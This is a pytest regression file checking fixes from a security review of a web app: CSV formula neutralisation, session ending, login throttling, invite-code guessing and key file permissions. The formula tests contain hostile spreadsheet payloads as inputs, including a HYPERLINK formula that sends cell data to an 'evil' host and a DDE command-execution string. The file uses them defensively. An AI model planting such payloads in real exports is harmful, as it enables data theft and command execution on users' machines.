"""Fixes from the independent security review of 2026-10-07 (Phase 6).

Each test reproduces what the reviewer demonstrated — or the bug found while
fixing it — and asserts it no longer works.
"""

from __future__ import annotations

import io
import statistics
import time
from pathlib import Path
from urllib.parse import quote

import pandas as pd
import pytest
from fastapi.testclient import TestClient

import caguard.api.workspace as workspace_module
from caguard.api.app import create_app
from caguard.auth.sessions import COOKIE_NAME, load_or_create_key
from caguard.auth.throttle import MAX_TRACKED, LoginThrottle
from caguard.benchmark.generator import GeneratorConfig, generate
from caguard.review.report import neutralise_formula

PASS = "a-long-enough-passphrase"


def _csv(frame: pd.DataFrame) -> bytes:
    buffer = io.StringIO()
    frame.to_csv(buffer, index=False)
    return buffer.getvalue().encode()


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("CAGUARD_INVITE_CODE", raising=False)
    monkeypatch.delenv("CAGUARD_DEMO", raising=False)


def _client(store: Path, name: str = "Reviewer", email: str = "r@example.com") -> TestClient:
    client = TestClient(create_app(store))
    body = {"email": email, "name": name, "password": PASS}
    assert client.post("/api/auth/signup", json=body).status_code == 200
    return client


# --- 1. CSV formula injection ------------------------------------------------------------


@pytest.mark.parametrize(
    ("cell", "expected"),
    [
        ('=HYPERLINK("http://evil")', '\'=HYPERLINK("http://evil")'),
        ("+1+2", "'+1+2"),
        ("-2+3", "'-2+3"),
        ("@SUM(A1)", "'@SUM(A1)"),
        ("   =1+1", "'   =1+1"),
        ("\t=1", "'\t=1"),
        ("V000123", "V000123"),
        ("Rent for April", "Rent for April"),
        (42, 42),
    ],
)
def test_formula_triggers_are_neutralised(cell: object, expected: object) -> None:
    assert neutralise_formula(cell) == expected


def test_no_cell_in_the_csv_export_can_run_as_a_formula(tmp_path: Path) -> None:
    lines = generate(GeneratorConfig(seed=101, n_vouchers=300)).lines
    lines["voucher_id"] = '=HYPERLINK("http://evil/?"&A1,"x")' + lines["voucher_id"].astype(str)
    lines["line_id"] = "@SUM(1)" + lines["line_id"].astype(str)
    client = _client(tmp_path / "review.db", name="=cmd|' /C calc'!A0")
    queue = client.post(
        "/api/engagements", files={"file": ("l.csv", _csv(lines), "text/csv")}
    ).json()
    engagement, voucher = queue["engagement"]["id"], queue["findings"][0]["voucher_id"]
    client.post(
        f"/api/engagements/{engagement}/decisions",
        json={"voucher_id": voucher, "action": "investigate", "note": "=1+2 follow up"},
    )

    exported = pd.read_csv(
        io.StringIO(client.get(f"/api/engagements/{engagement}/report.csv").text), dtype=str
    )
    for column in exported.columns:
        for value in exported[column].dropna():
            assert not value.lstrip().startswith(("=", "+", "@")), (column, value)
            if value.startswith("-"):
                float(value)  # only a negative number may start with a minus


# --- 2. sessions end when they should ------------------------------------------------------


def test_signing_out_ends_every_copy_of_the_session(tmp_path: Path) -> None:
    client = _client(tmp_path / "review.db")
    copied = client.cookies.get(COOKIE_NAME)

    client.post("/api/auth/logout")

    thief = TestClient(client.app)
    thief.cookies.set(COOKIE_NAME, copied or "")
    response = thief.get("/api/auth/me")
    assert response.status_code == 401
    assert "session has ended" in response.json()["detail"]


def test_a_password_change_ends_existing_sessions(tmp_path: Path) -> None:
    client = _client(tmp_path / "review.db")
    users = client.app.state.users  # type: ignore[attr-defined]
    user = users.by_email("r@example.com")
    users.set_password(user.id, "a-brand-new-passphrase")
    assert client.get("/api/auth/me").status_code == 401


def test_signing_in_again_after_signing_out_works(tmp_path: Path) -> None:
    client = _client(tmp_path / "review.db")
    client.post("/api/auth/logout")
    client.cookies.clear()
    login = client.post("/api/auth/login", json={"email": "r@example.com", "password": PASS})
    assert login.status_code == 200
    assert client.get("/api/auth/me").status_code == 200


# --- 3, 4, 7. sign-in and sign-up abuse ------------------------------------------------------


def test_the_throttle_cannot_be_grown_without_bound() -> None:
    clock = [0.0]
    throttle = LoginThrottle(clock=lambda: clock[0])
    for n in range(MAX_TRACKED + 5_000):
        throttle.failed(f"user{n}@example.com")
    assert len(throttle._failures) <= MAX_TRACKED

    clock[0] += 3600  # every failure has now expired
    throttle.failed("one-more@example.com")
    throttle.failed("and-another@example.com")
    assert len(throttle._failures) <= MAX_TRACKED


def test_checking_an_address_leaves_nothing_behind() -> None:
    throttle = LoginThrottle()
    for n in range(500):
        throttle.retry_after(f"never-failed{n}@example.com")
    assert not throttle._failures


def test_oversized_sign_in_fields_are_refused_before_any_work(tmp_path: Path) -> None:
    client = TestClient(create_app(tmp_path / "review.db"))
    huge = "x" * 5_000_000
    response = client.post("/api/auth/login", json={"email": huge, "password": "p"})
    assert response.status_code == 422


def test_invite_codes_cannot_be_guessed_quickly(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("CAGUARD_INVITE_CODE", "a-sufficiently-long-code")
    client = TestClient(create_app(tmp_path / "review.db"))
    statuses = [
        client.post(
            "/api/auth/signup",
            json={"email": f"g{n}@x.in", "name": "g", "password": PASS, "invite_code": f"guess{n}"},
        ).status_code
        for n in range(12)
    ]
    assert statuses[:10] == [422] * 10
    assert statuses[10:] == [429, 429]


def test_a_short_configured_invite_code_stops_the_app_from_starting(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("CAGUARD_INVITE_CODE", "letmein")
    with pytest.raises(RuntimeError, match="at least 16"):
        create_app(tmp_path / "review.db")


def test_sign_in_takes_as_long_for_an_unknown_address(tmp_path: Path) -> None:
    """Timing used to reveal which addresses have accounts (~21 ms vs ~1 ms)."""
    client = _client(tmp_path / "review.db")
    client.cookies.clear()

    def timed(email: str) -> float:
        started = time.perf_counter()
        client.post("/api/auth/login", json={"email": email, "password": "wrong-password"})
        return time.perf_counter() - started

    known = statistics.median(timed("r@example.com") for _ in range(3))
    unknown = statistics.median(timed(f"nobody{n}@example.com") for n in range(3))
    assert unknown > known * 0.4, (known, unknown)


# --- 5, 6. resources ---------------------------------------------------------------------------


def test_parquet_is_not_accepted_from_the_browser(tmp_path: Path) -> None:
    client = _client(tmp_path / "review.db")
    buffer = io.BytesIO()
    generate(GeneratorConfig(seed=7, n_vouchers=250)).lines.to_parquet(buffer, index=False)
    response = client.post(
        "/api/uploads", files={"file": ("l.parquet", buffer.getvalue(), "application/octet-stream")}
    )
    assert response.status_code == 400
    assert ".xlsx" in response.json()["detail"]


def test_only_a_few_analyses_are_held_in_memory_and_the_rest_rebuild(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(workspace_module, "MAX_CACHED_ANALYSES", 2)
    client = _client(tmp_path / "review.db")
    ids = [
        client.post(
            "/api/engagements",
            files={
                "file": (
                    f"l{seed}.csv",
                    _csv(generate(GeneratorConfig(seed=seed, n_vouchers=250)).lines),
                    "text/csv",
                )
            },
        ).json()["engagement"]["id"]
        for seed in (21, 22, 23)
    ]
    workspace = client.app.state.workspace  # type: ignore[attr-defined]
    assert list(workspace.analyses) == ids[1:]
    assert client.get(f"/api/engagements/{ids[0]}/queue").status_code == 200  # rebuilt
    assert len(workspace.analyses) == 2


# --- 9. secrets and leftovers -------------------------------------------------------------------


def test_a_truncated_signing_key_is_refused(tmp_path: Path) -> None:
    (tmp_path / "session.key").write_bytes(b"")
    with pytest.raises(RuntimeError, match="signing key"):
        load_or_create_key(tmp_path)


def test_a_new_signing_key_is_owner_only(tmp_path: Path) -> None:
    load_or_create_key(tmp_path)
    assert (tmp_path / "session.key").stat().st_mode & 0o777 == 0o600


def test_leftover_uploads_are_swept_at_startup(tmp_path: Path) -> None:
    leftover = tmp_path / "upload-abc123.csv"
    leftover.write_text("a client's ledger left behind by a crash")
    create_app(tmp_path / "review.db")
    assert not leftover.exists()


# --- found while fixing #10: voucher numbers with slashes ---


def test_a_voucher_number_with_slashes_can_be_opened_and_explained(tmp_path: Path) -> None:
    lines = generate(GeneratorConfig(seed=5, n_vouchers=300)).lines
    lines["voucher_id"] = "JV/2024/" + lines["voucher_id"].str[1:]
    lines["line_id"] = lines["voucher_id"] + "-" + lines["line_number"].astype(str)
    client = _client(tmp_path / "review.db")
    queue = client.post(
        "/api/engagements", files={"file": ("l.csv", _csv(lines), "text/csv")}
    ).json()
    engagement, voucher = queue["engagement"]["id"], queue["findings"][0]["voucher_id"]
    assert "/" in voucher

    base = f"/api/engagements/{engagement}/findings/{quote(voucher, safe='')}"
    assert client.get(base).json()["voucher_id"] == voucher
    assert client.get(f"{base}/explanation").json()["voucher_id"] == voucher
